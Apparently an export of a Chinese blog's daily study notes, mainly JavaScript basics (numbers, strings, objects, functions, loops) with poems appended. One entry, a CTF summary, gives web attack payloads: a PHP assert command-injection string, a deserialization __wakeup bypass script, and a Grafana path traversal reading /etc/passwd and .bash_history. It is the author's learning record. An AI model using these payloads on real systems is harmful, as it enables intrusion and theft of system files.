href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="今天就想说一句-我这是学js上头了嘛，为啥学这么细……"><a href="#今天就想说一句-我这是学js上头了嘛，为啥学这么细……" class="headerlink" title="今天就想说一句:我这是学js上头了嘛，为啥学这么细……"></a>今天就想说一句:我这是学js上头了嘛，为啥学这么细……</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（2）</title>
      <link href="/2022/11/07/20221107/"/>
      <url>/2022/11/07/20221107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="原始类型的方法"><a href="#原始类型的方法" class="headerlink" title="原始类型的方法"></a>原始类型的方法</h4><h5 id="原始类型和对象之间的关键区别。"><a href="#原始类型和对象之间的关键区别。" class="headerlink" title="原始类型和对象之间的关键区别。"></a>原始类型和对象之间的关键区别。</h5><p>一个原始值：<br>是原始类型中的一种值。<br>在 JavaScript 中有 7 种原始类型：string，number，bigint，boolean，symbol，null 和 undefined。<br>一个对象：<br>能够存储多个值作为属性。<br>可以使用大括号 {} 创建对象，例如：{name: “John”, age: 30}。JavaScript 中还有其他种类的对象，例如函数就是对象。<br>原始类型不是对象，它们不能存储额外的数据。</p><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>两种类型:<br>常规数字以 64 位的格式 IEEE-754 存储，也被称为“双精度浮点数”<br>BigInt 用于表示任意长度的整数</p><p>编写数字的方法:<br>let billion = 1e9;           // 10 亿，字面意思：数字 1 后面跟 9 个 0<br>alert( 7.3e9 );              // 73 亿（与 7300000000 和 7_300_000_000 相同）<br>let mcs = 0.000001 = 1e-6;   // 1 的左边有 6 个 0;</p><p>二进制0b  八进制0o  十六进制0x</p><p>toString(base):<br>返回在给定 base 进制数字系统中 num 的字符串表示形式<br>alert( 123456..toString(36) );     // 三十六进制，2n9c</p><p>使用两个点来调用一个方法:<br>123456.toString(36)相当于(123456).toString(36)<br>语法隐含了第一个点之后的部分为小数部分。再放一个点，JS就知道小数部分为空。</p><p>舍入:</p><pre><code>        Math.floor     Math.ceil     Math.round     Math.trunc3.1        3              4             3             33.6        3              4           4           3-1.1       -2             -1            -1            -1-1.6       -2             -1            -2            -1</code></pre><p>Math.floor向下舍入<br>Math.ceil向上舍入<br>Math.round向最近的整数舍入<br>Math.trunc（IE 浏览器不支持这个方法）移除小数点后的所有内容而没有舍入</p><p>舍入到小数点后 n 位:<br>1.将数字乘以 100，调用舍入函数，然后再将其除回<br>2.toFixed(n) 将数字四舍五入到小数点后 n 位，并以字符串形式返回结果</p><p>不精确的计算:<br>数字是以 64 位格式 IEEE-754 表示的:其中 52 位被用于存储这些数字， 11 位用于存储小数点的位置，而 1 位用于符号。<br>1.如果一个数字真的很大，则可能会溢出 64 位存储，变成一个特殊的数值 Infinity<br>2.一个数字以其二进制的形式存储在内存中。但是在十进制数字系统中看起来很简单的 0.1，0.2 这样的小数，实际上在二进制形式中是无限循环小数<br>最可靠的解决方法是借助方法 toFixed(n) 对结果进行舍入</p><p>isFinite 和 isNaN:<br>属于 number 类型，但不是“普通”数字<br>Infinity（和 -Infinity）是一个特殊的数值，比任何数值都大（小）。<br>NaN 代表一个 error。<br>isNaN(value) 将其参数转换为数字，然后测试它是否为 NaN<br>isFinite(value) 将其参数转换为数字，如果是常规数字而不是 NaN/Infinity/-Infinity，则返回 true<br>注:在所有数字函数中，包括 isFinite，空字符串或仅有空格的字符串均被视为 0<br>比较两个值是否完全相同时，它使用Object.is(a,b) === true</p><p>parseInt(str, radix) 和 parseFloat:<br>从字符串中“读取”数字，直到无法读取为止。parseInt 返回一个整数，parseFloat 返回一个浮点数,没有数字可读时为NaN<br>parseInt(str, radix) 的第二个参数为要解析的str的进制,可选</p><p>其他数学函数:<br>Math.random()返回一个从 0 到 1 的随机数（不包括 1）<br>Math.max(a, b, c…)返回最大值<br>Math.pow(n, power)返回 n 的power次幂</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>文本数据被以字符串形式存储，单个字符没有单独的类型。<br>字符串的内部格式始终是 UTF-16，它不依赖于页面编码。<br>引号（Quotes）:<br>1.反引号允许我们通过 ${…} 将任何表达式嵌入到字符串中<br>2.允许字符串跨行</p><p>特殊字符:</p><pre><code>\n         换行\r         Windows 文本文件中，两个字符 \r\n 的组合代表一个换行。而在非 Windows 操作系统上，它就是 \n。\&#39;和\&quot;     引号\          转义字符\\         反斜线\t         制表符\b         退格\f         换页\v         垂直\xXX       十六进制 Unicode XX 的 Unicode 字符\u&#123;X…XXXXXX&#125;（1 到 6 个十六进制字符）     具有给定 UTF-32 编码的 Unicode 符号</code></pre><p>字符串长度:</p><pre><code>let str = `Hello`;// 第一个字符alert( str[0] ); // Halert( str.charAt(0) ); // H// 最后一个字符alert( str[str.length - 1] ); // o如果没有找到字符，[] 返回 undefined，而 charAt 返回一个空字符串</code></pre><p>字符串是不可变的:<br>要更改就要创建一个新的字符串，并将其分配给新字符串而不是以前的字符串</p><p>改变大小写:</p><pre><code>toLowerCase() 和 toUpperCase() 改变单个字符大小写alert( &#39;Interface&#39;[0].toLowerCase() ); // &#39;i&#39;</code></pre><p>查找子字符串:<br>str.indexOf(substr, pos)<br>从给定位置 pos 开始，在 str 中查找 substr，如果没有找到，则返回 -1，否则返回匹配成功的位置<br>如果我们对所有存在位置都感兴趣，可以在一个循环中使用 indexOf<br>str.lastIndexOf(substr, position)<br>从字符串的末尾开始搜索到开头,以相反的顺序列出这些事件</p><p>按位（bitwise）NOT :<br>将数字转换为 32-bit 整数（如果存在小数部分，则删除小数部分），然后对其二进制表示形式中的所有位均取反<br>对于 32-bit 整数，~n 等于 -(n+1)</p><p>includes，startsWith，endsWith:<br>includes检测匹配，但不需要它的位置,第二个可选参数是开始搜索的起始位置</p><pre><code>alert( &quot;Widget&quot;.startsWith(&quot;Wid&quot;) );        // true，&quot;Widget&quot; 以 &quot;Wid&quot; 开始alert( &quot;Widget&quot;.endsWith(&quot;get&quot;) );          // true，&quot;Widget&quot; 以 &quot;get&quot; 结束</code></pre><p>获取子字符串:</p><pre><code>str.slice(start,end)返回字符串从 start 到（但不包括）end 的部分start/end 也有可能是负值。它们的意思是起始位置从字符串结尾计算str.substring(start,end)返回字符串从 start 到（但不包括）end 的部分。这与 slice 几乎相同，但它允许 start 大于 endstr.substr(start,length)返回字符串从 start 开始的给定 length 的部分。与以前的方法相比，这个允许我们指定 length 而不是结束位置第一个参数可能是负数，从结尾算起</code></pre><p>比较字符串:<br>1.小写字母总是大于大写字母<br>2.带变音符号的字母存在“乱序”的情况(例如部分国家名字)<br>str.codePointAt(pos)返回在 pos 位置的字符代码<br>String.fromCodePoint(code)通过数字 code 创建字符<br>可以用 \u 后跟十六进制代码，通过这些代码添加 Unicode 字符</p><p><a href="https://zh.javascript.info/string#nei-bu-unicode">内部，Unicode</a></p><p>其他几种有用的字符串方法：<br>str.trim()删除字符串前后的空格 (“trims”)。<br>str.repeat(n)重复字符串 n 次。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我打江南走过"><a href="#我打江南走过" class="headerlink" title="我打江南走过"></a>我打江南走过</h5><h5 id="那等在季节里的容颜如莲花的开落"><a href="#那等在季节里的容颜如莲花的开落" class="headerlink" title="那等在季节里的容颜如莲花的开落"></a>那等在季节里的容颜如莲花的开落</h5><h5 id="东风不来，三月的柳絮不飞"><a href="#东风不来，三月的柳絮不飞" class="headerlink" title="东风不来，三月的柳絮不飞"></a>东风不来，三月的柳絮不飞</h5><h5 id="你底心如小小寂寞的城"><a href="#你底心如小小寂寞的城" class="headerlink" title="你底心如小小寂寞的城"></a>你底心如小小寂寞的城</h5><h5 id="恰若青石的街道向晚"><a href="#恰若青石的街道向晚" class="headerlink" title="恰若青石的街道向晚"></a>恰若青石的街道向晚</h5><h5 id="跫音不响，三月的春帷不揭"><a href="#跫音不响，三月的春帷不揭" class="headerlink" title="跫音不响，三月的春帷不揭"></a>跫音不响，三月的春帷不揭</h5><h5 id="你底心是小小的窗扉紧掩"><a href="#你底心是小小的窗扉紧掩" class="headerlink" title="你底心是小小的窗扉紧掩"></a>你底心是小小的窗扉紧掩</h5><h5 id="我达达的马蹄是美丽的错误"><a href="#我达达的马蹄是美丽的错误" class="headerlink" title="我达达的马蹄是美丽的错误"></a>我达达的马蹄是美丽的错误</h5><h5 id="我不是归人，是个过客"><a href="#我不是归人，是个过客" class="headerlink" title="我不是归人，是个过客"></a>我不是归人，是个过客</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信安CTF总结</title>
      <link href="/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（1）</title>
      <link href="/2022/11/05/20221105/"/>
      <url>/2022/11/05/20221105/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="注-本章节较难，请选择性阅读"><a href="#注-本章节较难，请选择性阅读" class="headerlink" title="注:本章节较难，请选择性阅读"></a>注:本章节较难，请选择性阅读</h5><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>使用{…}来创建对象。一个属性就是一个键值对（“key: value”），其中键是一个字符串（也叫做属性名），值可以是任何值。</p><pre><code>构造对象方法:let user = new Object();     // “构造函数” 的语法let user = &#123;&#125;;               // “字面量” 的语法读取文件的属性:alert( user.name );          // Johnalert( user.age );           // 30移除属性:delete user.age;             // 移除age这个key方括号:let user = &#123;&#125;;// 设置user[&quot;likes birds&quot;] = true;  // 单引号或双引号都可以// 读取alert(user[&quot;likes birds&quot;]);  // true// 删除delete user[&quot;likes birds&quot;];属性值简写:name, 与 name: name 相同属性名称限制:类型会被自动地转换为字符串但__proto__属性。不能将它设置为一个非对象的值属性存在性测试:alert( user.noSuchProperty === undefined );       // true 意思是没有这个属性alert( &quot;age&quot; in user );                           // true 存在</code></pre><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for..in 循环"></a>for..in 循环</h4><pre><code>for (key in object) &#123;  // 对此对象属性中的每个键执行的代码&#125;遍历一个对象时，整数属性会被进行从小到大排序但是 “+49” 和 “1.2” 不行，那它们就按照创建时的顺序来排序</code></pre><h4 id="对象引用和复制"><a href="#对象引用和复制" class="headerlink" title="对象引用和复制"></a>对象引用和复制</h4><p>赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址”。</p><h5 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用:"></a>对象的引用:</h5><pre><code>let user = &#123; name: &#39;John&#39; &#125;;let admin = user;admin.name = &#39;Pete&#39;;               // 通过 &quot;admin&quot; 引用来修改alert(user.name);                  // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>仅当两个对象为同一对象时，两者才相等。<br>两个独立的对象则并不相等，即使它们看起来很像（都为空）。</p><h5 id="对象的复制"><a href="#对象的复制" class="headerlink" title="对象的复制"></a>对象的复制</h5><p>通过遍历已有对象的属性，并在原始类型值的层面复制它们，以实现对已有对象结构的复制。</p><pre><code>let user = &#123;  name: &quot;John&quot;,&#125;;let clone = &#123;&#125;;                       // 新的空对象for (let key in user) &#123;               // 将 user 中所有的属性拷贝到其中  clone[key] = user[key];             // 现在 clone 是带有相同内容的完全独立的对象&#125;clone.name = &quot;Pete&quot;;                  // 改变了其中的数据alert( user.name );                   // 原来的对象中的 name 属性依然是 John【也可以使用 Object.assign 方法】Object.assign(dest, [src1, src2, src3...])1.dest 是指目标对象2.src1, ..., srcN是源对象（需传递的参数）3.将所有源对象的属性拷贝到目标对象 dest 中4.调用结果返回 dest5.如果被拷贝的属性的属性名已经存在，那么它会被覆盖</code></pre><h5 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h5><pre><code>let 克隆生成的对象 = Object.assign(&#123;&#125;, 克隆的对象);或者使用“深拷贝”函数，例如 _.cloneDeep(obj)</code></pre><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>1.可达性<br>&emsp;&emsp;如果一个值可以通过引用链从根访问任何其他值，则认为该值是可达的<br>&emsp;&emsp;垃圾回收器会删除掉那些已经不可达的(没有外部对其的引用)<br>2.内部算法(mark-and-sweep):<br>&emsp;&emsp;垃圾收集器遍历所有的根，并“标记”（记住）它们和他们的引用。<br>&emsp;&emsp;没有被标记的对象都会被删除。<br>3.优化建议:<br>&emsp;&emsp;分代收集/增量收集/闲时收集<br>&emsp;&emsp;<a href="https://zh.javascript.info/garbage-collection#zong-jie">进阶了解</a></p><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><p>存储在对象属性中的函数被称为“方法”<br>使用函数表达式创建一个函数，并将其指定给对象的属性，随后调用它。就叫做得到了 user 对象的 sayHi 方法。</p><h5 id="this"><a href="#this" class="headerlink" title="this"></a>this</h5><p>访问对象中存储的信息<br>this可以用于任何函数,它取决于代码上下文<br>严格模式下没有对象的情况下调用:this==undefined但尝试访问this.name将会报错<br>this的值是在调用时计算出来的，它的值取决于在“点符号前”的是什么对象。<br>箭头函数没有自己的this。若在箭头函数中引用this，则this值取决于外部“正常的”函数。</p><pre><code>let user = &#123; name: &quot;John&quot; &#125;;let admin = &#123; name: &quot;Admin&quot; &#125;;function sayHi() &#123;  alert( this.name );&#125;// 在两个对象中使用相同的函数user.f = sayHi;admin.f = sayHi;// 这两个调用有不同的 this 值// 函数内部的 &quot;this&quot; 是“点符号前面”的那个对象user.f(); // John（this == user）admin.f(); // Admin（this == admin）admin[&#39;f&#39;](); // Admin（使用点符号或方括号语法来访问这个方法，都没有关系。）</code></pre><h4 id="重点误区，必须记住"><a href="#重点误区，必须记住" class="headerlink" title="重点误区，必须记住"></a><a href="https://zh.javascript.info/object-methods#zai-dui-xiang-zi-mian-liang-zhong-shi-yong-this">重点误区，必须记住</a></h4><h4 id="构造器和操作符-“new”"><a href="#构造器和操作符-“new”" class="headerlink" title="构造器和操作符 “new”"></a>构造器和操作符 “new”</h4><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>命名以大写字母开头。<br>只能由 “new” 操作符来执行</p><pre><code>function User(name) &#123;                1.一个新的空对象被创建并分配给 this。  this.name = name;                  2.函数体执行。通常它会修改 this，为其添加新的属性。  this.isAdmin = false;              3.返回 this 的值。&#125;</code></pre><p>任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器</p><h4 id="new-function-…"><a href="#new-function-…" class="headerlink" title="new function() { … }"></a>new function() { … }</h4><p>如果有许多行用于创建单个复杂对象的代码，可以将它们封装在一个立即调用的构造函数中</p><pre><code>// 创建一个函数并立即使用 new 调用它let user = new function() &#123;  this.name = &quot;John&quot;;  this.isAdmin = false;  // ……用于用户创建的其他代码  // 也许是复杂的逻辑和语句  // 局部变量等&#125;;</code></pre><p>这个构造函数不能被再次调用，因为它不保存在任何地方，只是被创建和调用。<br>因此，这个技巧旨在封装构建单个对象的代码，而无需将来重用。</p><h4 id="构造器模式测试-无需重视"><a href="#构造器模式测试-无需重视" class="headerlink" title="构造器模式测试,无需重视"></a><a href="https://zh.javascript.info/constructor-new#gou-zao-qi-mo-shi-ce-shi-newtarget">构造器模式测试,无需重视</a></h4><h4 id="可选链"><a href="#可选链" class="headerlink" title="可选链"></a>可选链</h4><pre><code>语法有三种形式：obj?.prop —— 如果 obj 存在则返回 obj.prop，否则返回 undefined。obj?.[prop] —— 如果 obj 存在则返回 obj[prop]，否则返回 undefined。obj.method?.() —— 如果 obj.method 存在则调用 obj.method()，否则返回 undefined。总结?. 检查左边部分是否为 null/undefined，如果不是则继续运算。</code></pre><h4 id="symbol-类型"><a href="#symbol-类型" class="headerlink" title="symbol 类型"></a>symbol 类型</h4><p>“symbol” 值表示唯一的标识符。<br>使用 Symbol() 来创建这种类型的值<br>可以给 symbol 一个描述（也称为 symbol 名）          //let id = Symbol(“id”);<br>symbol 保证是唯一的。即使我们创建了许多具有相同描述的 symbol，它们的值也是不同。symbol 不会被自动转换为字符串<br>真的想显示一个 symbol，我们需要</p><pre><code>在它上面调用 .toString()    let id = Symbol(&quot;id&quot;);    alert(id.toString());        //Symbol(id)或者获取 symbol.description 属性，只显示描述    let id = Symbol(&quot;id&quot;);    alert(id.description);       // id</code></pre><p>主要的使用场景：<br>1.“隐藏” 对象属性。<br>    如果我们想要向“属于”另一个脚本或者库的对象添加一个属性，我们可以创建一个 symbol 并使用它作为属性的键。<br>2.JavaScript 使用了许多系统 symbol，这些 symbol 可以作为 Symbol.* 访问。我们可以使用它们来改变一些内建行为。<br>3.symbol 在 for…in 中会被跳过<br>4.Object.keys(user) 也会忽略它们<br>5.相反，Object.assign 会同时复制字符串和 symbol 属性</p><h4 id="对象-——-原始值转换"><a href="#对象-——-原始值转换" class="headerlink" title="对象 —— 原始值转换"></a>对象 —— 原始值转换</h4><p>JavaScript 不允许自定义运算符对对象的处理方式<br>此类运算的情况下，对象会被自动转换为原始值，然后对这些原始值进行运算，并得到运算结果（也是一个原始值）</p><h5 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h5><p>1.没有转换为布尔值,所有的对象在布尔上下文（context）中均为 true<br>2.数字转换发生在对象相减或应用数学函数时<br>3.字符串转换通常发生在像 alert(obj) 这样输出一个对象和类似的上下文中</p><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><p>“string”（对于 alert 和其他需要字符串的操作）<br>“number”（对于数学运算）<br>“default”（少数运算符，通常对象以和 “number” 相同的方式实现 “default” 转换）</p><h4 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h4><p>用来给转换方法命名</p><h4 id="toString-valueOf"><a href="#toString-valueOf" class="headerlink" title="toString/valueOf"></a>toString/valueOf</h4><p>对于 “string” hint：调用 toString 方法，如果它不存在，则调用 valueOf 方法（因此，对于字符串转换，优先调用 toString）。<br>对于其他 hint：调用 valueOf 方法，如果它不存在，则调用 toString 方法（因此，对于数学运算，优先调用 valueOf 方法）。</p><h4 id="转换可以返回任何原始类型"><a href="#转换可以返回任何原始类型" class="headerlink" title="转换可以返回任何原始类型"></a>转换可以返回任何原始类型</h4><p>它们不一定会返回 “hint” 的原始值<br>唯一强制性的事情是：这些方法必须返回一个原始值，而不是对象。</p><h4 id="进一步的转换"><a href="#进一步的转换" class="headerlink" title="进一步的转换"></a>进一步的转换</h4><p>如果我们将对象作为参数传递，则会出现两个运算阶段：<br>1.对象被转换为原始值（通过前面我们描述的规则）。<br>2.如果还需要进一步计算，则生成的原始值会被进一步转换。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><pre><code>首先调用 obj[Symbol.toPrimitive](hint) 如果这个方法存在，否则，如果 hint 是 &quot;string&quot;        尝试调用 obj.toString() 或 obj.valueOf()，无论哪个存在。否则，如果 hint 是 &quot;number&quot; 或者 &quot;default&quot;        尝试调用 obj.valueOf() 或 obj.toString()，无论哪个存在。在实际使用中，通常只实现 obj.toString() 作为字符串转换的“全能”方法就足够了，该方法应该返回对象的“人类可读”表示，用于日志记录或调试。</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="遇事不决可问春风，春风不语即随本心。"><a href="#遇事不决可问春风，春风不语即随本心。" class="headerlink" title="遇事不决可问春风，春风不语即随本心。"></a>遇事不决可问春风，春风不语即随本心。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（4）</title>
      <link href="/2022/11/04/20221104/"/>
      <url>/2022/11/04/20221104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><pre><code>let sayHi = function() &#123;  alert( &quot;Hello&quot; );&#125;;function关键字后面没有函数名。函数表达式允许省略函数名注意末尾会有个分号!因为这是以 function(…) &#123;…&#125; 的形式创建的。它不是函数语法的一部分。含义:&quot;创建一个函数并将其放入变量sayHi中&quot;。alert( sayHi );         // 显示函数代码————因为函数是一个值alert( sayHi() );       // 执行函数let func = sayHi;       //将 sayHi 复制到了变量 func</code></pre><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><pre><code>function ask(question, yes, no) &#123;  if (confirm(question)) yes()  else no();&#125;function showOk() &#123;  alert( &quot;You agreed.&quot; );&#125;function showCancel() &#123;  alert( &quot;You canceled the execution.&quot; );&#125;// 用法：函数 showOk 和 showCancel 被作为参数传入到 askask(&quot;Do you agree?&quot;, showOk, showCancel);</code></pre><p>showOk 是回答 “yes” 的回调，showCancel 是回答 “no” 的回调。</p><h5 id="函数表达式-vs-函数声明"><a href="#函数表达式-vs-函数声明" class="headerlink" title="函数表达式 vs 函数声明"></a>函数表达式 vs 函数声明</h5><p>1.语法<br>函数声明：在主代码流中声明为单独的语句的函数<br>函数表达式：在一个表达式中或另一个语法结构中创建的函数。下面这个函数是在赋值表达式 = 右侧创建的<br>2.创建函数时机<br>在函数声明被定义之前，它就可以被调用。<br>函数表达式是在代码执行到达时被创建，并且仅从那一刻起可用。<br>3.块级作用域<br>严格模式下，当一个函数声明在一个代码块内时，它在该代码块内的任何位置都是可见的。但在代码块外不可见。</p><pre><code>let age = 16;              // 拿 16 作为例子if (age &lt; 18) &#123;  welcome();               // \   (运行)  function welcome() &#123;     //  |    alert(&quot;Hello!&quot;);       //  |  函数声明在声明它的代码块内任意位置都可用  &#125;                        //  |  在花括号外部调用函数，我们看不到它们内部的函数声明  welcome();               // /   (运行)&#125; else &#123;  function welcome() &#123;    alert(&quot;Greetings!&quot;);  &#125;&#125;welcome();                 // Error: welcome is not defined【正确写法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome;if (age &lt; 18) &#123;  welcome = function() &#123;    alert(&quot;Hello!&quot;);  &#125;;&#125; else &#123;  welcome = function() &#123;    alert(&quot;Greetings!&quot;);  &#125;;&#125;welcome(); // 现在可以了【改进方法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome = (age &lt; 18) ?  function() &#123; alert(&quot;Hello!&quot;); &#125; :  function() &#123; alert(&quot;Greetings!&quot;); &#125;;welcome(); // 现在可以了</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><pre><code>单行箭头函数:let sum = (a, b) =&gt; a + b;/* 这个箭头函数是下面这个函数的更短的版本：let sum = function(a, b) &#123;  return a + b;&#125;;*/alert( sum(1, 2) ); // 3多行箭头函数:let sum = (a, b) =&gt; &#123;  // 花括号表示开始一个多行函数  let result = a + b;  return result;       // 如果我们使用了花括号，那么我们需要一个显式的 “return”&#125;;alert( sum(1, 2) );    // 3从 =&gt; 的左侧获取参数，计算并返回右侧表达式的计算结果用花括号括起来之后，需要包含 return 才能返回值（就像常规函数一样）只有一个参数，还可以省略掉参数外的圆括号没有参数，括号则是空的（但括号必须保留）</code></pre><h4 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h4><p>1.函数是值。它们可以在代码的任何地方被分配，复制或声明。<br>2.如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。<br>3.如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。<br>4.在执行代码块之前，内部算法会先处理函数声明(所以函数声明在其被声明的代码块内的任何位置都是可见的)<br>5.函数表达式在执行流程到达时创建。<br>6.首选使用函数声明;仅当函数声明不适合对应的任务时，才应使用函数表达式。</p><h3 id="javascript基础复习"><a href="#javascript基础复习" class="headerlink" title="javascript基础复习"></a>javascript基础复习</h3><p>1.语句用分号分隔<br>2.即使我们在某处添加了「额外的」分号，这也不是错误。分号会被忽略的。<br>3.尽量使用”use strict”<br>4.使用let，const（不变的，不能被改变），var（旧式的，稍后会看到）声明变量<br>5.变量是动态类型的，它们可以存储任何值<br>6.有 8 种数据类型：<br>&nbsp;&nbsp;number — 可以是浮点数，也可以是整数，<br>&nbsp;&nbsp;bigint — 用于任意长度的整数，<br>&nbsp;&nbsp;string — 字符串类型，<br>&nbsp;&nbsp;boolean — 逻辑值：true/false，<br>&nbsp;&nbsp;null — 具有单个值 null 的类型，表示“空”或“不存在”，<br>&nbsp;&nbsp;undefined — 具有单个值 undefined 的类型，表示“未分配（未定义）”，<br>&nbsp;&nbsp;object 和 symbol — 对于复杂的数据结构和唯一标识符，我们目前还没学习这个类型。<br>7.交互:alert、prompt 和 confirm<br>8.二进制加号 + 可以连接字符串。如果任何一个操作数是一个字符串，那么另一个操作数也将被转换为字符串<br>9.三元运算符:cond?resultA:resultB。如果cond为真,则返回resultA,否则返回resultB<br>10.空值合并运算符:a??b的结果是a,除非a为null/undefined,这时结果是b。<br>11.在 for(let…) 循环内部声明的变量只在该循环内可见。但可以省略let并重用已有的变量。<br>12.break/continue允许退出整个循环/当前迭代。使用标签来打破嵌套循环<br>13.switch”结构可以替代多个if检查。它内部使用===进行比较。<br>14.prompt的结果是一个字符串，而不是数字<br>15.函数声明和循环语句后不需要加分号</p><h5 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h5><p><a href="https://zh.javascript.info/debugging-chrome">在浏览器中调试</a><br><a href="https://zh.javascript.info/coding-style#tasks">代码风格!!!</a><br><a href="https://zh.javascript.info/comments">注释</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>从岐山到长安，高铁只需要一个小时就能抵达，这么一段路，丞相却走了一生。<br>从生至死，人需要经历百年，但有一段岁月，却跟着我走完了一生。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（3）</title>
      <link href="/2022/11/03/20221103/"/>
      <url>/2022/11/03/20221103/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><pre><code>let i = 0;while (i &lt; 3) &#123;           #条件的结果会被转化为布尔值  alert( i );  i++;&#125;</code></pre><p>如果循环体只有一条语句(单循环体)，则可以省略大括号</p><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><pre><code>let i = 0;do &#123;  alert( i );  i++;&#125; while (i &lt; 3);</code></pre><p>将条件检查移至循环体下面<br>先执行循环体，然后检查条件，当条件为真时，重复执行循环体</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><pre><code>for 